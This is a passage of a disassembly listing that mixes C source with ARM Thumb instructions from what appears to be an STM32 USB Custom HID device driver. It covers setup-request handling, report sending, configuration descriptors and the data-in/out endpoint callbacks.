 800884e:	0a1b      	lsrs	r3, r3, #8
 8008850:	b29b      	uxth	r3, r3
 8008852:	b2db      	uxtb	r3, r3
 8008854:	461a      	mov	r2, r3
 8008856:	693b      	ldr	r3, [r7, #16]
 8008858:	615a      	str	r2, [r3, #20]
          break;
 800885a:	e01d      	b.n	8008898 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 800885c:	693b      	ldr	r3, [r7, #16]
 800885e:	3314      	adds	r3, #20
 8008860:	2201      	movs	r2, #1
 8008862:	4619      	mov	r1, r3
 8008864:	6878      	ldr	r0, [r7, #4]
 8008866:	f003 fcfd 	bl	800c264 <USBD_CtlSendData>
          break;
 800886a:	e015      	b.n	8008898 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 800886c:	693b      	ldr	r3, [r7, #16]
 800886e:	2201      	movs	r2, #1
 8008870:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008872:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008874:	683b      	ldr	r3, [r7, #0]
 8008876:	88db      	ldrh	r3, [r3, #6]
 8008878:	2b0f      	cmp	r3, #15
 800887a:	bf28      	it	cs
 800887c:	230f      	movcs	r3, #15
 800887e:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008880:	461a      	mov	r2, r3
 8008882:	6878      	ldr	r0, [r7, #4]
 8008884:	f003 fd1a 	bl	800c2bc <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008888:	e006      	b.n	8008898 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 800888a:	6839      	ldr	r1, [r7, #0]
 800888c:	6878      	ldr	r0, [r7, #4]
 800888e:	f003 fc78 	bl	800c182 <USBD_CtlError>
          ret = USBD_FAIL;
 8008892:	2303      	movs	r3, #3
 8008894:	75fb      	strb	r3, [r7, #23]
          break;
 8008896:	bf00      	nop
      }
      break;
 8008898:	e09a      	b.n	80089d0 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800889a:	683b      	ldr	r3, [r7, #0]
 800889c:	785b      	ldrb	r3, [r3, #1]
 800889e:	2b0b      	cmp	r3, #11
 80088a0:	f200 8086 	bhi.w	80089b0 <USBD_CUSTOM_HID_Setup+0x204>
 80088a4:	a201      	add	r2, pc, #4	; (adr r2, 80088ac <USBD_CUSTOM_HID_Setup+0x100>)
 80088a6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80088aa:	bf00      	nop
 80088ac:	080088dd 	.word	0x080088dd
 80088b0:	080089bf 	.word	0x080089bf
 80088b4:	080089b1 	.word	0x080089b1
 80088b8:	080089b1 	.word	0x080089b1
 80088bc:	080089b1 	.word	0x080089b1
 80088c0:	080089b1 	.word	0x080089b1
 80088c4:	08008907 	.word	0x08008907
 80088c8:	080089b1 	.word	0x080089b1
 80088cc:	080089b1 	.word	0x080089b1
 80088d0:	080089b1 	.word	0x080089b1
 80088d4:	0800895f 	.word	0x0800895f
 80088d8:	08008989 	.word	0x08008989
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80088dc:	687b      	ldr	r3, [r7, #4]
 80088de:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80088e2:	b2db      	uxtb	r3, r3
 80088e4:	2b03      	cmp	r3, #3
 80088e6:	d107      	bne.n	80088f8 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80088e8:	f107 030e 	add.w	r3, r7, #14
 80088ec:	2202      	movs	r2, #2
 80088ee:	4619      	mov	r1, r3
 80088f0:	6878      	ldr	r0, [r7, #4]
 80088f2:	f003 fcb7 	bl	800c264 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80088f6:	e063      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80088f8:	6839      	ldr	r1, [r7, #0]
 80088fa:	6878      	ldr	r0, [r7, #4]
 80088fc:	f003 fc41 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 8008900:	2303      	movs	r3, #3
 8008902:	75fb      	strb	r3, [r7, #23]
          break;
 8008904:	e05c      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008906:	683b      	ldr	r3, [r7, #0]
 8008908:	885b      	ldrh	r3, [r3, #2]
 800890a:	0a1b      	lsrs	r3, r3, #8
 800890c:	b29b      	uxth	r3, r3
 800890e:	2b22      	cmp	r3, #34	; 0x22
 8008910:	d110      	bne.n	8008934 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008912:	683b      	ldr	r3, [r7, #0]
 8008914:	88db      	ldrh	r3, [r3, #6]
 8008916:	2b49      	cmp	r3, #73	; 0x49
 8008918:	bf28      	it	cs
 800891a:	2349      	movcs	r3, #73	; 0x49
 800891c:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 800891e:	687b      	ldr	r3, [r7, #4]
 8008920:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008924:	687a      	ldr	r2, [r7, #4]
 8008926:	33b0      	adds	r3, #176	; 0xb0
 8008928:	009b      	lsls	r3, r3, #2
 800892a:	4413      	add	r3, r2
 800892c:	685b      	ldr	r3, [r3, #4]
 800892e:	681b      	ldr	r3, [r3, #0]
 8008930:	61bb      	str	r3, [r7, #24]
 8008932:	e00d      	b.n	8008950 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008934:	683b      	ldr	r3, [r7, #0]
 8008936:	885b      	ldrh	r3, [r3, #2]
 8008938:	0a1b      	lsrs	r3, r3, #8
 800893a:	b29b      	uxth	r3, r3
 800893c:	2b21      	cmp	r3, #33	; 0x21
 800893e:	d107      	bne.n	8008950 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008940:	4b26      	ldr	r3, [pc, #152]	; (80089dc <USBD_CUSTOM_HID_Setup+0x230>)
 8008942:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008944:	683b      	ldr	r3, [r7, #0]
 8008946:	88db      	ldrh	r3, [r3, #6]
 8008948:	2b09      	cmp	r3, #9
 800894a:	bf28      	it	cs
 800894c:	2309      	movcs	r3, #9
 800894e:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008950:	8bfb      	ldrh	r3, [r7, #30]
 8008952:	461a      	mov	r2, r3
 8008954:	69b9      	ldr	r1, [r7, #24]
 8008956:	6878      	ldr	r0, [r7, #4]
 8008958:	f003 fc84 	bl	800c264 <USBD_CtlSendData>
          break;
 800895c:	e030      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800895e:	687b      	ldr	r3, [r7, #4]
 8008960:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008964:	b2db      	uxtb	r3, r3
 8008966:	2b03      	cmp	r3, #3
 8008968:	d107      	bne.n	800897a <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 800896a:	693b      	ldr	r3, [r7, #16]
 800896c:	3318      	adds	r3, #24
 800896e:	2201      	movs	r2, #1
 8008970:	4619      	mov	r1, r3
 8008972:	6878      	ldr	r0, [r7, #4]
 8008974:	f003 fc76 	bl	800c264 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008978:	e022      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 800897a:	6839      	ldr	r1, [r7, #0]
 800897c:	6878      	ldr	r0, [r7, #4]
 800897e:	f003 fc00 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 8008982:	2303      	movs	r3, #3
 8008984:	75fb      	strb	r3, [r7, #23]
          break;
 8008986:	e01b      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008988:	687b      	ldr	r3, [r7, #4]
 800898a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800898e:	b2db      	uxtb	r3, r3
 8008990:	2b03      	cmp	r3, #3
 8008992:	d106      	bne.n	80089a2 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008994:	683b      	ldr	r3, [r7, #0]
 8008996:	885b      	ldrh	r3, [r3, #2]
 8008998:	b2db      	uxtb	r3, r3
 800899a:	461a      	mov	r2, r3
 800899c:	693b      	ldr	r3, [r7, #16]
 800899e:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80089a0:	e00e      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80089a2:	6839      	ldr	r1, [r7, #0]
 80089a4:	6878      	ldr	r0, [r7, #4]
 80089a6:	f003 fbec 	bl	800c182 <USBD_CtlError>
            ret = USBD_FAIL;
 80089aa:	2303      	movs	r3, #3
 80089ac:	75fb      	strb	r3, [r7, #23]
          break;
 80089ae:	e007      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 80089b0:	6839      	ldr	r1, [r7, #0]
 80089b2:	6878      	ldr	r0, [r7, #4]
 80089b4:	f003 fbe5 	bl	800c182 <USBD_CtlError>
          ret = USBD_FAIL;
 80089b8:	2303      	movs	r3, #3
 80089ba:	75fb      	strb	r3, [r7, #23]
          break;
 80089bc:	e000      	b.n	80089c0 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 80089be:	bf00      	nop
      }
      break;
 80089c0:	e006      	b.n	80089d0 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 80089c2:	6839      	ldr	r1, [r7, #0]
 80089c4:	6878      	ldr	r0, [r7, #4]
 80089c6:	f003 fbdc 	bl	800c182 <USBD_CtlError>
      ret = USBD_FAIL;
 80089ca:	2303      	movs	r3, #3
 80089cc:	75fb      	strb	r3, [r7, #23]
      break;
 80089ce:	bf00      	nop
  }
  return (uint8_t)ret;
 80089d0:	7dfb      	ldrb	r3, [r7, #23]
}
 80089d2:	4618      	mov	r0, r3
 80089d4:	3720      	adds	r7, #32
 80089d6:	46bd      	mov	sp, r7
 80089d8:	bd80      	pop	{r7, pc}
 80089da:	bf00      	nop
 80089dc:	20000090 	.word	0x20000090

080089e0 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 80089e0:	b580      	push	{r7, lr}
 80089e2:	b086      	sub	sp, #24
 80089e4:	af00      	add	r7, sp, #0
 80089e6:	60f8      	str	r0, [r7, #12]
 80089e8:	60b9      	str	r1, [r7, #8]
 80089ea:	4613      	mov	r3, r2
 80089ec:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80089ee:	68fb      	ldr	r3, [r7, #12]
 80089f0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089f4:	68fb      	ldr	r3, [r7, #12]
 80089f6:	32b0      	adds	r2, #176	; 0xb0
 80089f8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80089fc:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 80089fe:	697b      	ldr	r3, [r7, #20]
 8008a00:	2b00      	cmp	r3, #0
 8008a02:	d101      	bne.n	8008a08 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008a04:	2303      	movs	r3, #3
 8008a06:	e019      	b.n	8008a3c <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008a08:	68fb      	ldr	r3, [r7, #12]
 8008a0a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008a0e:	b2db      	uxtb	r3, r3
 8008a10:	2b03      	cmp	r3, #3
 8008a12:	d112      	bne.n	8008a3a <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008a14:	697b      	ldr	r3, [r7, #20]
 8008a16:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008a1a:	2b00      	cmp	r3, #0
 8008a1c:	d10b      	bne.n	8008a36 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008a1e:	697b      	ldr	r3, [r7, #20]
 8008a20:	2201      	movs	r2, #1
 8008a22:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008a26:	4b07      	ldr	r3, [pc, #28]	; (8008a44 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008a28:	7819      	ldrb	r1, [r3, #0]
 8008a2a:	88fb      	ldrh	r3, [r7, #6]
 8008a2c:	68ba      	ldr	r2, [r7, #8]
 8008a2e:	68f8      	ldr	r0, [r7, #12]
 8008a30:	f004 f9ea 	bl	800ce08 <USBD_LL_Transmit>
 8008a34:	e001      	b.n	8008a3a <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008a36:	2301      	movs	r3, #1
 8008a38:	e000      	b.n	8008a3c <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008a3a:	2300      	movs	r3, #0
}
 8008a3c:	4618      	mov	r0, r3
 8008a3e:	3718      	adds	r7, #24
 8008a40:	46bd      	mov	sp, r7
 8008a42:	bd80      	pop	{r7, pc}
 8008a44:	200000a6 	.word	0x200000a6

08008a48 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008a48:	b580      	push	{r7, lr}
 8008a4a:	b084      	sub	sp, #16
 8008a4c:	af00      	add	r7, sp, #0
 8008a4e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a50:	2181      	movs	r1, #129	; 0x81
 8008a52:	4815      	ldr	r0, [pc, #84]	; (8008aa8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a54:	f002 fd32 	bl	800b4bc <USBD_GetEpDesc>
 8008a58:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a5a:	2101      	movs	r1, #1
 8008a5c:	4812      	ldr	r0, [pc, #72]	; (8008aa8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a5e:	f002 fd2d 	bl	800b4bc <USBD_GetEpDesc>
 8008a62:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a64:	68fb      	ldr	r3, [r7, #12]
 8008a66:	2b00      	cmp	r3, #0
 8008a68:	d009      	beq.n	8008a7e <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008a6a:	68fb      	ldr	r3, [r7, #12]
 8008a6c:	2200      	movs	r2, #0
 8008a6e:	f042 0202 	orr.w	r2, r2, #2
 8008a72:	711a      	strb	r2, [r3, #4]
 8008a74:	2200      	movs	r2, #0
 8008a76:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a78:	68fb      	ldr	r3, [r7, #12]
 8008a7a:	2205      	movs	r2, #5
 8008a7c:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008a7e:	68bb      	ldr	r3, [r7, #8]
 8008a80:	2b00      	cmp	r3, #0
 8008a82:	d009      	beq.n	8008a98 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008a84:	68bb      	ldr	r3, [r7, #8]
 8008a86:	2200      	movs	r2, #0
 8008a88:	f042 0202 	orr.w	r2, r2, #2
 8008a8c:	711a      	strb	r2, [r3, #4]
 8008a8e:	2200      	movs	r2, #0
 8008a90:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a92:	68bb      	ldr	r3, [r7, #8]
 8008a94:	2205      	movs	r2, #5
 8008a96:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008a98:	687b      	ldr	r3, [r7, #4]
 8008a9a:	2229      	movs	r2, #41	; 0x29
 8008a9c:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008a9e:	4b02      	ldr	r3, [pc, #8]	; (8008aa8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008aa0:	4618      	mov	r0, r3
 8008aa2:	3710      	adds	r7, #16
 8008aa4:	46bd      	mov	sp, r7
 8008aa6:	bd80      	pop	{r7, pc}
 8008aa8:	20000064 	.word	0x20000064

08008aac <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008aac:	b580      	push	{r7, lr}
 8008aae:	b084      	sub	sp, #16
 8008ab0:	af00      	add	r7, sp, #0
 8008ab2:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008ab4:	2181      	movs	r1, #129	; 0x81
 8008ab6:	4815      	ldr	r0, [pc, #84]	; (8008b0c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008ab8:	f002 fd00 	bl	800b4bc <USBD_GetEpDesc>
 8008abc:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008abe:	2101      	movs	r1, #1
 8008ac0:	4812      	ldr	r0, [pc, #72]	; (8008b0c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008ac2:	f002 fcfb 	bl	800b4bc <USBD_GetEpDesc>
 8008ac6:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008ac8:	68fb      	ldr	r3, [r7, #12]
 8008aca:	2b00      	cmp	r3, #0
 8008acc:	d009      	beq.n	8008ae2 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008ace:	68fb      	ldr	r3, [r7, #12]
 8008ad0:	2200      	movs	r2, #0
 8008ad2:	f042 0202 	orr.w	r2, r2, #2
 8008ad6:	711a      	strb	r2, [r3, #4]
 8008ad8:	2200      	movs	r2, #0
 8008ada:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008adc:	68fb      	ldr	r3, [r7, #12]
 8008ade:	2205      	movs	r2, #5
 8008ae0:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ae2:	68bb      	ldr	r3, [r7, #8]
 8008ae4:	2b00      	cmp	r3, #0
 8008ae6:	d009      	beq.n	8008afc <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ae8:	68bb      	ldr	r3, [r7, #8]
 8008aea:	2200      	movs	r2, #0
 8008aec:	f042 0202 	orr.w	r2, r2, #2
 8008af0:	711a      	strb	r2, [r3, #4]
 8008af2:	2200      	movs	r2, #0
 8008af4:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008af6:	68bb      	ldr	r3, [r7, #8]
 8008af8:	2205      	movs	r2, #5
 8008afa:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008afc:	687b      	ldr	r3, [r7, #4]
 8008afe:	2229      	movs	r2, #41	; 0x29
 8008b00:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b02:	4b02      	ldr	r3, [pc, #8]	; (8008b0c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008b04:	4618      	mov	r0, r3
 8008b06:	3710      	adds	r7, #16
 8008b08:	46bd      	mov	sp, r7
 8008b0a:	bd80      	pop	{r7, pc}
 8008b0c:	20000064 	.word	0x20000064

08008b10 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008b10:	b580      	push	{r7, lr}
 8008b12:	b084      	sub	sp, #16
 8008b14:	af00      	add	r7, sp, #0
 8008b16:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008b18:	2181      	movs	r1, #129	; 0x81
 8008b1a:	4815      	ldr	r0, [pc, #84]	; (8008b70 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b1c:	f002 fcce 	bl	800b4bc <USBD_GetEpDesc>
 8008b20:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b22:	2101      	movs	r1, #1
 8008b24:	4812      	ldr	r0, [pc, #72]	; (8008b70 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b26:	f002 fcc9 	bl	800b4bc <USBD_GetEpDesc>
 8008b2a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b2c:	68fb      	ldr	r3, [r7, #12]
 8008b2e:	2b00      	cmp	r3, #0
 8008b30:	d009      	beq.n	8008b46 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b32:	68fb      	ldr	r3, [r7, #12]
 8008b34:	2200      	movs	r2, #0
 8008b36:	f042 0202 	orr.w	r2, r2, #2
 8008b3a:	711a      	strb	r2, [r3, #4]
 8008b3c:	2200      	movs	r2, #0
 8008b3e:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b40:	68fb      	ldr	r3, [r7, #12]
 8008b42:	2205      	movs	r2, #5
 8008b44:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008b46:	68bb      	ldr	r3, [r7, #8]
 8008b48:	2b00      	cmp	r3, #0
 8008b4a:	d009      	beq.n	8008b60 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008b4c:	68bb      	ldr	r3, [r7, #8]
 8008b4e:	2200      	movs	r2, #0
 8008b50:	f042 0202 	orr.w	r2, r2, #2
 8008b54:	711a      	strb	r2, [r3, #4]
 8008b56:	2200      	movs	r2, #0
 8008b58:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b5a:	68bb      	ldr	r3, [r7, #8]
 8008b5c:	2205      	movs	r2, #5
 8008b5e:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008b60:	687b      	ldr	r3, [r7, #4]
 8008b62:	2229      	movs	r2, #41	; 0x29
 8008b64:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b66:	4b02      	ldr	r3, [pc, #8]	; (8008b70 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008b68:	4618      	mov	r0, r3
 8008b6a:	3710      	adds	r7, #16
 8008b6c:	46bd      	mov	sp, r7
 8008b6e:	bd80      	pop	{r7, pc}
 8008b70:	20000064 	.word	0x20000064

08008b74 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b74:	b480      	push	{r7}
 8008b76:	b083      	sub	sp, #12
 8008b78:	af00      	add	r7, sp, #0
 8008b7a:	6078      	str	r0, [r7, #4]
 8008b7c:	460b      	mov	r3, r1
 8008b7e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008b80:	687b      	ldr	r3, [r7, #4]
 8008b82:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b86:	687b      	ldr	r3, [r7, #4]
 8008b88:	32b0      	adds	r2, #176	; 0xb0
 8008b8a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b8e:	2200      	movs	r2, #0
 8008b90:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008b94:	2300      	movs	r3, #0
}
 8008b96:	4618      	mov	r0, r3
 8008b98:	370c      	adds	r7, #12
 8008b9a:	46bd      	mov	sp, r7
 8008b9c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008ba0:	4770      	bx	lr

08008ba2 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008ba2:	b580      	push	{r7, lr}
 8008ba4:	b084      	sub	sp, #16
 8008ba6:	af00      	add	r7, sp, #0
 8008ba8:	6078      	str	r0, [r7, #4]
 8008baa:	460b      	mov	r3, r1
 8008bac:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008bae:	687b      	ldr	r3, [r7, #4]
 8008bb0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bb4:	687b      	ldr	r3, [r7, #4]
 8008bb6:	32b0      	adds	r2, #176	; 0xb0
 8008bb8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bbc:	2b00      	cmp	r3, #0
 8008bbe:	d101      	bne.n	8008bc4 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008bc0:	2303      	movs	r3, #3
 8008bc2:	e017      	b.n	8008bf4 <USBD_CUSTOM_HID_DataOut+0x52>
  }

